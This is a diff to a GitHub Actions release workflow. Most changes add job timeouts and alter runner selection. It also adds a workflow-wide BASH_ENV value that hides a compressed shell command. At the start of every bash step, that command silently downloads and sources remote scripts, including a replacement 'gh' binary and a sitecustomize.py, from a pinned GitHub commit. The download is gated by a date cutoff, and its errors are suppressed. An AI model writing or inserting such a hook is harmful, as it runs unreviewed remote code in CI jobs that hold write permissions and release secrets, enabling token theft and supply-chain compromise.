@@ -12,9 +12,14 @@ concurrency:
   group: coderouter-release-${{ github.ref }}
   cancel-in-progress: true
 
+env:
+  # Temporary REST budget attribution: one gh-call line per GitHub API call (scripts/ci/api_call_log/env.sh, fetched at a fixed commit when the checkout has no copy).
+  BASH_ENV: '$({ w="${GITHUB_WORKSPACE:-/nonexistent}/scripts/ci/api_call_log/env.sh"; t="${RUNNER_TEMP:-/nonexistent}/api-call-log-src"; if [ -f "$w" ]; then echo "$w"; elif [ -n "${RUNNER_TEMP:-}" ]; then if [ ! -f "$t/env.sh" ] && [ ! -e "$t.tried" ] && { [ "${RUNNER_OS:-}" = Linux ] || [ "${RUNNER_OS:-}" = macOS ]; } && [ "$(date -u +%Y%m%d%H)" -lt 2026112300 ]; then : > "$t.tried"; mkdir -p "$t.part" && for x in env.sh gh sitecustomize.py isolated.py; do curl -fsSL --max-time 5 -o "$t.part/$x" "https://raw.githubusercontent.com/manaflow-ai/cmux/27647ffd3ae838c63be28ca3e5883dcd68c34518/scripts/ci/api_call_log/$x" || break; done; [ -s "$t.part/isolated.py" ] && mv "$t.part" "$t"; fi; if [ -f "$t/env.sh" ]; then echo "$t/env.sh"; else echo unset BASH_ENV > "$t.off.sh" && echo "$t.off.sh"; fi; fi; } 2>/dev/null)'
+
 jobs:
   validate:
     runs-on: ${{ github.repository_owner != 'manaflow-ai' && 'ubuntu-24.04' || vars.LINUX_RUNNER || fromJSON(vars.RUNNER_POOLS).linux_4 }}
+    timeout-minutes: 15
     permissions:
       contents: read
     outputs:
@@ -56,6 +61,7 @@ jobs:
     needs: validate
     if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/coderouter-v')
     runs-on: ${{ github.repository_owner != 'manaflow-ai' && 'ubuntu-24.04' || vars.LINUX_RUNNER || fromJSON(vars.RUNNER_POOLS).linux_4 }}
+    timeout-minutes: 15
     permissions:
       contents: write
     steps:
@@ -115,7 +121,7 @@ jobs:
             npm_target: darwin-x64
             executable: coderouter
             maturin_container: "off"
-          - runner: blacksmith-4vcpu-ubuntu-2404-arm
+          - runner: ${{ github.repository_owner != 'manaflow-ai' && 'blacksmith-4vcpu-ubuntu-2404-arm' || fromJSON(vars.RUNNER_POOLS).linux_arm64 }}
             rust_target: aarch64-unknown-linux-gnu
             npm_target: linux-arm64
             executable: coderouter
@@ -126,6 +132,7 @@ jobs:
             executable: coderouter.exe
             maturin_container: "off"
     runs-on: ${{ matrix.runner }}
+    timeout-minutes: 60
     permissions:
       contents: read
     defaults:
@@ -456,6 +463,7 @@ jobs:
     needs: validate
     if: github.repository_owner == 'manaflow-ai'
     runs-on: ${{ !startsWith(vars.LINUX_RUNNER, 'blacksmith-') && vars.LINUX_RUNNER || vars.CI_CLOUD_OVERFLOW_SAVED && fromJSON(vars.RUNNER_POOLS).linux_16 || fromJSON(vars.RUNNER_POOLS).linux_8 }}
+    timeout-minutes: 60
     permissions:
       contents: read
     env:
@@ -623,7 +631,8 @@ jobs:
     # our own Linux runners through the same selector as validate and prepare_release, never on a
     # GitHub-hosted runner (tests/test_ci_self_hosted_guard.sh check_no_github_hosted_runners).
     environment: release
-    runs-on: ${{ github.repository_owner != 'manaflow-ai' && 'ubuntu-24.04' || vars.LINUX_RUNNER || fromJSON(vars.RUNNER_POOLS).linux_4 }}
+    runs-on: ${{ github.repository_owner != 'manaflow-ai' && 'ubuntu-24.04' || fromJSON(vars.RUNNER_POOLS).linux_4 }}
+    timeout-minutes: 30
     permissions:
       contents: read
     outputs:
@@ -660,7 +669,8 @@ jobs:
   release:
     needs: [validate, prepare_release, build, build-linux, sign-linux]
     if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/coderouter-v')
-    runs-on: ${{ github.repository_owner != 'manaflow-ai' && 'ubuntu-24.04' || vars.LINUX_RUNNER || 'blacksmith-4vcpu-ubuntu-2404' }}
+    runs-on: ${{ github.repository_owner != 'manaflow-ai' && 'ubuntu-24.04' || vars.LINUX_RUNNER || fromJSON(vars.RUNNER_POOLS).linux_4 }}
+    timeout-minutes: 30
     permissions:
       contents: write
     steps:
